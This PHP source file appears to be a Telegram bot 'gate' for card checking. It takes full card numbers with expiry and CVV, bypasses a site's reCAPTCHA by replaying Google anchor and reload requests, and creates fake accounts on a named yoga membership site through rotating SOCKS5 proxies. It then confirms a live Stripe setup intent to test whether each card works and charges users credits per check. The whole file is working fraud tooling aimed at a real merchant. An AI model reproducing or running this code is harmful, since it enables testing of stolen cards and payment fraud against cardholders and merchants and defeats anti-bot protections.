<?php
$start_time = microtime(true);

if ($text == '/ax') {
$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "𝐆𝐚𝐭𝐞 𝐈𝐧𝐟𝐨 - <b>\n• Stripe Auth (v3) - /ax \n• Other Gates - /cmds </b> ",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙧𝙚𝙙𝙞𝙩𝙨 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$credits_file = file_get_contents('Tools/Credits.txt');
$credits_lines = explode("\n", $credits_file);
foreach ($credits_lines as $line) {
  if (strpos($line, $userId) === 0) {
    $user_credits = intval(substr($line, strlen($userId) + 1));
    break;
  }
}
if ($user_credits < 1) { $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
            $data = http_build_query(array(
                'chat_id' => $chat_id,
                'message_id' => $message_idd,
                'text' => "𝐃𝐞𝐚𝐫 <b><a href='tg://user?id=$userId'>$username</a></b> 𝐘𝐨𝐮 𝐃𝐨𝐧'𝐭 𝐇𝐚𝐯𝐞 𝐒𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝",
                'parse_mode' => 'HTML'
            ));
            $response = sendAsyncRequest($url, $data);exit();}

include 'Tools/Regex.php';

if ( empty($cc) or empty($mes) or empty($year) or empty($cvv) ) 
{$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "<b>⚠ [𝑨𝑳𝑬𝑹𝑻] 𝑷𝑳𝑬𝑨𝑺𝑬 𝑪𝑯𝑬𝑪𝑲 𝑻𝑯𝑬 𝑰𝑵𝑷𝑼𝑻 𝑭𝑰𝑬𝑳𝑫𝑺 𝑨𝑵𝑫 𝑻𝑹𝒀 𝑨𝑮𝑨𝑰𝑵 - 𝑻𝒆𝒙𝒕 𝑺𝒉𝒐𝒖𝒍𝒅 𝑶𝒏𝒍𝒚 𝑪𝒐𝒏𝒕𝒂𝒊𝒏 𝒄𝒄 𝒎𝒐𝒏 𝒚𝒆𝒂𝒓 𝒄𝒗𝒗 </b>",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}
include 'Tools/Antispam.php';

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$i = explode("|", $lista);
$cc = $i[0];
$c1 = substr($cc, 0, 4); 
$c2 = substr($cc, 4, 4); 
$c3 = substr($cc, 8, 4); 
$c4 = substr($cc, -4);
$mon = $i[1];
$year = $i[2];
$cvv = $i[3];

if(strlen($year) == 4){
$year = substr($year, 2);
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$U = ucfirst(str_shuffle('bdfkegvjdgjdgrtgertgvbrhdtg'));
$E = str_shuffle("kueerurefmiereapp8524erf6");

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

#CAPTCHA BYPASS

# CAPTCHA Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6Le7SUokAAAAAFKPE1EFMhPjpxQpN9w-x41MSSDC&co=aHR0cHM6Ly95b2dhMTUuY29tOjQ0Mw..&hl=en&v=6MY32oPwFCn9SUKWt8czDsDw&size=invisible&cb=487r5v2cj8n4');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$cap1 = curl_exec($ch);
$TK = trim(strip_tags(getStr($cap1,'type="hidden" id="recaptcha-token" value="','"')));
$Address = curl_getinfo($ch)['redirect_url'];
# CAPTCHA Req..

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api2/reload?k=6Le7SUokAAAAAFKPE1EFMhPjpxQpN9w-x41MSSDC');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'origin: https://www.google.com',
'referer: '.$Address.'',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'v=6MY32oPwFCn9SUKWt8czDsDw&reason=q&c='.$TK.'&k=6Le7SUokAAAAAFKPE1EFMhPjpxQpN9w-x41MSSDC&co=aHR0cHM6Ly95b2dhMTUuY29tOjQ0Mw..&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!q62grYxHRvVxjUIjSFNd0mlvrZ-iCgIHAAAB6FcAAAANnAkBySdqTJGFRK7SirleWAwPVhv9-XwP8ugGSTJJgQ46-0IMBKN8HUnfPqm4sCefwxOOEURND35prc9DJYG0pbmg_jD18qC0c-lQzuPsOtUhHTtfv3--SVCcRvJWZ0V3cia65HGfUys0e1K-IZoArlxM9qZfUMXJKAFuWqZiBn-Qi8VnDqI2rRnAQcIB8Wra6xWzmFbRR2NZqF7lDPKZ0_SZBEc99_49j07ISW4X65sMHL139EARIOipdsj5js5JyM19a2TCZJtAu4XL1h0ZLfomM8KDHkcl_b0L-jW9cvAe2K2uQXKRPzruAvtjdhMdODzVWU5VawKhpmi2NCKAiCRUlJW5lToYkR_X-07AqFLY6qi4ZbJ_sSrD7fCNNYFKmLfAaxPwPmp5Dgei7KKvEQmeUEZwTQAS1p2gaBmt6SCOgId3QBfF_robIkJMcXFzj7R0G-s8rwGUSc8EQzT_DCe9SZsJyobu3Ps0-YK-W3MPWk6a69o618zPSIIQtSCor9w_oUYTLiptaBAEY03NWINhc1mmiYu2Yz5apkW_KbAp3HD3G0bhzcCIYZOGZxyJ44HdGsCJ-7ZFTcEAUST-aLbS-YN1AyuC7ClFO86CMICVDg6aIDyCJyIcaJXiN-bN5xQD_NixaXatJy9Mx1XEnU4Q7E_KISDJfKUhDktK5LMqBJa-x1EIOcY99E-eyry7crf3-Hax3Uj-e-euzRwLxn2VB1Uki8nqJQVYUgcjlVXQhj1X7tx4jzUb0yB1TPU9uMBtZLRvMCRKvFdnn77HgYs5bwOo2mRECiFButgigKXaaJup6NM4KRUevhaDtnD6aJ8ZWQZTXz_OJ74a_OvPK9eD1_5pTG2tUyYNSyz-alhvHdMt5_MAdI3op4ZmcvBQBV9VC2JLjphDuTW8eW_nuK9hN17zin6vjEL8YIm_MekB_dIUK3T1Nbyqmyzigy-Lg8tRL6jSinzdwOTc9hS5SCsPjMeiblc65aJC8AKmA5i80f-6Eg4BT305UeXKI3QwhI3ZJyyQAJTata41FoOXl3EF9Pyy8diYFK2G-CS8lxEpV7jcRYduz4tEPeCpBxU4O_KtM2iv4STkwO4Z_-c-fMLlYu9H7jiFnk6Yh8XlPE__3q0FHIBFf15zVSZ3qroshYiHBMxM5BVQBOExbjoEdYKx4-m9c23K3suA2sCkxHytptG-6yhHJR3EyWwSRTY7OpX_yvhbFri0vgchw7U6ujyoXeCXS9N4oOoGYpS5OyFyRPLxJH7yjXOG2Play5HJ91LL6J6qg1iY8MIq9XQtiVZHadVpZVlz3iKcX4vXcQ3rv_qQwhntObGXPAGJWEel5OiJ1App7mWy961q3mPg9aDEp9VLKU5yDDw1xf6tOFMwg2Q-PNDaKXAyP_FOkxOjnu8dPhuKGut6cJr449BKDwbnA9BOomcVSztEzHGU6HPXXyNdZbfA6D12f5lWxX2B_pobw3a1gFLnO6mWaNRuK1zfzZcfGTYMATf6d7sj9RcKNS230XPHWGaMlLmNxsgXkEN7a9PwsSVwcKdHg_HU4vYdRX6vkEauOIwVPs4dS7yZXmtvbDaX1zOU4ZYWg0T42sT3nIIl9M2EeFS5Rqms_YzNp8J-YtRz1h5RhtTTNcA5jX4N-xDEVx-vD36bZVzfoMSL2k85PKv7pQGLH-0a3DsR0pePCTBWNORK0g_RZCU_H898-nT1syGzNKWGoPCstWPRvpL9cnHRPM1ZKemRn0nPVm9Bgo0ksuUijgXc5yyrf5K49UU2J5JgFYpSp7aMGOUb1ibrj2sr-D63d61DtzFJ2mwrLm_KHBiN_ECpVhDsRvHe5iOx_APHtImevOUxghtkj-8RJruPgkTVaML2MEDOdL_UYaldeo-5ckZo3VHss7IpLArGOMTEd0bSH8tA8CL8RLQQeSokOMZ79Haxj8yE0EAVZ-k9-O72mmu5I0wH5IPgapNvExeX6O1l3mC4MqLhKPdOZOnTiEBlSrV4ZDH_9fhLUahe5ocZXvXqrud9QGNeTpZsSPeIYubeOC0sOsuqk10sWB7NP-lhifWeDob-IK1JWcgFTytVc99RkZTjUcdG9t8prPlKAagZIsDr1TiX3dy8sXKZ7d9EXQF5P_rHJ8xvmUtCWqbc3V5jL-qe8ANypwHsuva75Q6dtqoBR8vCE5xWgfwB0GzR3Xi_l7KDTsYAQIrDZVyY1UxdzWBwJCrvDrtrNsnt0S7BhBJ4ATCrW5VFPqXyXRiLxHCIv9zgo-NdBZQ4hEXXxMtbem3KgYUB1Rals1bbi8X8MsmselnHfY5LdOseyXWIR2QcrANSAypQUAhwVpsModw7HMdXgV9Uc-HwCMWafOChhBr88tOowqVHttPtwYorYrzriXNRt9LkigESMy1bEDx79CJguitwjQ9IyIEu8quEQb_-7AEXrfDzl_FKgASnnZLrAfZMtgyyddIhBpgAvgR_c8a8Nuro-RGV0aNuunVg8NjL8binz9kgmZvOS38QaP5anf2vgzJ9wC0ZKDg2Ad77dPjBCiCRtVe_dqm7FDA_cS97DkAwVfFawgce1wfWqsrjZvu4k6x3PAUH1UNzQUxVgOGUbqJsaFs3GZIMiI8O6-tZktz8i8oqpr0RjkfUhw_I2szHF3LM20_bFwhtINwg0rZxRTrg4il-_q7jDnVOTqQ7fdgHgiJHZw_OOB7JWoRW6ZlJmx3La8oV93fl1wMGNrpojSR0b6pc8SThsKCUgoY6zajWWa3CesX1ZLUtE7Pfk9eDey3stIWf2acKolZ9fU-gspeACUCN20EhGT-HvBtNBGr_xWk1zVJBgNG29olXCpF26eXNKNCCovsILNDgH06vulDUG_vR5RrGe5LsXksIoTMYsCUitLz4HEehUOd9mWCmLCl00eGRCkwr9EB557lyr7mBK2KPgJkXhNmmPSbDy6hPaQ057zfAd5s_43UBCMtI-aAs5NN4TXHd6IlLwynwc1zsYOQ6z_HARlcMpCV9ac-8eOKsaepgjOAX4YHfg3NekrxA2ynrvwk9U-gCtpxMJ4f1cVx3jExNlIX5LxE46FYIhQ');
$cap2 = curl_exec($ch);
$TR = trim(strip_tags(getStr($cap2,'["rresp","','"')));

# 01 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://yoga15.com/register/monthly-plan/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); 
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'origin: https://yoga15.com',
'referer: https://yoga15.com/register/monthly-plan/',
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryl8j4dhH2RRqPjmHl',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="mepr_process_signup_form"

Y
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="mepr_product_id"

807
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="user_first_name"

efvgwer
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="user_last_name"

ewvgefv
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="mepr-address-one"

6767 Gardenia Road
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="mepr-address-two"


------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="mepr-address-city"

Nilje Gaon
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="mepr-address-country"

US
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="mepr-address-state"

CA
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="mepr-address-zip"

92055
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="mepr-geo-country"


------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="user_login"

'.$U.'
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="user_email"

'.$E.'@gmail.com
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="mepr_user_password"

Joker@20192019
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="mepr_user_password_confirm"

Joker@20192019
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="mp-pass-strength"

2
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="mepr_coupon_code"


------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="mepr_payment_method"

pry76z-p2
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="mepractivecampaign_opt_in"

on
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="g-recaptcha-response"

'.$TR.'
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="mepr_no_val"


------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="NRFUmTd-VbynZ"

bmSyiRCF5p2Bkrv
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="OSQzeyrA_mYhPg"

H2i7aYPJcOEv
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="NRFUmTd-VbynZ"

bmSyiRCF5p2Bkrv
------WebKitFormBoundaryl8j4dhH2RRqPjmHl
Content-Disposition: form-data; name="OSQzeyrA_mYhPg"

H2i7aYPJcOEv
------WebKitFormBoundaryl8j4dhH2RRqPjmHl--');
$curl1 = curl_exec($ch);
$redirect = curl_getinfo($ch)['redirect_url'];

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

#02. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$redirect.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); 
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
$curl2 = curl_exec($ch);
$txid = trim(strip_tags(getStr($curl2,'mepr_transaction_id" value="','"')));

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙂𝙤𝙞𝙣𝙜 𝙏𝙤 𝘾𝙝𝙚𝙘𝙠𝙤𝙪𝙩 𝙋𝙖𝙜𝙚 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

# 03 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://yoga15.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); 
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryfcBE3UPN290VExmk',
'origin: https://yoga15.com',
'referer: https://yoga15.com/register/monthly-plan/?action=checkout&txn=qxq',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryfcBE3UPN290VExmk
Content-Disposition: form-data; name="mepr_transaction_id"

'.$txid.'
------WebKitFormBoundaryfcBE3UPN290VExmk
Content-Disposition: form-data; name="address_required"

1
------WebKitFormBoundaryfcBE3UPN290VExmk
Content-Disposition: form-data; name="card-first-name"

efvgwer
------WebKitFormBoundaryfcBE3UPN290VExmk
Content-Disposition: form-data; name="card-last-name"

ewvgefv
------WebKitFormBoundaryfcBE3UPN290VExmk
Content-Disposition: form-data; name="card-address-one"

6767 Gardenia Road
------WebKitFormBoundaryfcBE3UPN290VExmk
Content-Disposition: form-data; name="card-address-two"


------WebKitFormBoundaryfcBE3UPN290VExmk
Content-Disposition: form-data; name="card-address-city"

Nilje Gaon
------WebKitFormBoundaryfcBE3UPN290VExmk
Content-Disposition: form-data; name="card-address-country"

US
------WebKitFormBoundaryfcBE3UPN290VExmk
Content-Disposition: form-data; name="card-address-state"

CA
------WebKitFormBoundaryfcBE3UPN290VExmk
Content-Disposition: form-data; name="card-address-zip"

92055
------WebKitFormBoundaryfcBE3UPN290VExmk
Content-Disposition: form-data; name="action"

mepr_stripe_create_payment_client_secret
------WebKitFormBoundaryfcBE3UPN290VExmk
Content-Disposition: form-data; name="mepr_payment_method"

pry76z-p2
------WebKitFormBoundaryfcBE3UPN290VExmk--');
$curl3 = curl_exec($ch);
$seti1 = trim(strip_tags(getStr($curl3,'client_secret":"','"')));
$seti2 = trim(strip_tags(getStr($curl3,'client_secret":"','_secret')));
$hash = trim(strip_tags(getStr($curl3,'hash":"','",')));

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙄𝙣 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$max_retries = 5;
$retry_count = 0;

# 05 Req..
$ch = curl_init();
do {include'Tools/Proxy.php';
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/'.$seti2.'/confirm');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); 
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials); 
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'return_url=https%3A%2F%2Fyoga15.com%2Fthank-you%2F%3Fmembership%3Dsign-up-for-your-free-14-day-trial%26membership_id%3D807%26transaction_id%3D34903%26subscription_id%3D19519&payment_method_data[billing_details][address][line1]=Gardenia+drive+6767&payment_method_data[billing_details][address][city]=San+Jose&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][state]=CA&payment_method_data[billing_details][address][postal_code]=92055&payment_method_data[billing_details][name]=Salmam+khan&payment_method_data[type]=card&payment_method_data[card][number]='.$c1.'+'.$c2.'+'.$c3.'+'.$c4.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_year]='.$year.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[time_on_page]=259501&payment_method_data[payment_user_agent]=stripe.js%2Ff5dde66da2%3B+stripe-js-v3%2Ff5dde66da2%3B+payment-element&payment_method_data[guid]=bacb93a3-9f88-4922-97ea-70b7445b428860fc4c&payment_method_data[muid]=7bc5d691-4423-4f35-9295-35d01723075547b20a&payment_method_data[sid]=5d12b3e8-d708-4ead-ad10-a0906731ebf51f61f0&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_88nWYPIN8giHfJdU1OGiRpU300ROG8jOil&_stripe_version=2022-08-01&client_secret='.$seti1.'');
$curl5 = curl_exec($ch);

if (strpos($curl5, 'intent_confirmation_challenge')) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 - $response_code | $retry_count]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}
  
$status = trim(strip_tags(getStr($curl5,'status": "','"')));
$dcode = trim(strip_tags(getStr($curl5,'code": "','"')));
$messagee = trim(strip_tags(getStr($curl5,'message": "','"')));
curl_close($ch);

file_put_contents('ax.txt', $curl5);

if (strpos($curl5, 'status": "succeeded'))
{ $creditsToDeduct = 2;} 
else 
{ $creditsToDeduct = 1;}
$creditsFile = fopen('Tools/Credits.txt', 'r+');
while (!feof($creditsFile)) {
    $line = fgets($creditsFile);
    $lineParts = explode(' ', $line);
    $userIdd = trim($lineParts[0]);
    $credits = intval(trim($lineParts[1]));
    if ($userIdd == $userId) {
        $newCredits = max(0, $credits - $creditsToDeduct);
        fseek($creditsFile, -strlen($line), SEEK_CUR);
        fwrite($creditsFile, "$userId $newCredits\n");
        break;}}
fclose($creditsFile);

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙍𝙚𝙨𝙪𝙡𝙩 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$end_time = microtime(true);
$time0 = $end_time - $start_time;
$time = substr_replace($time0, '',4);

if (strpos($curl5, 'card_error')) {
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( $messagee - $dcode )\n--» <u>Gateway </u> : Stripe Auth (v3)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
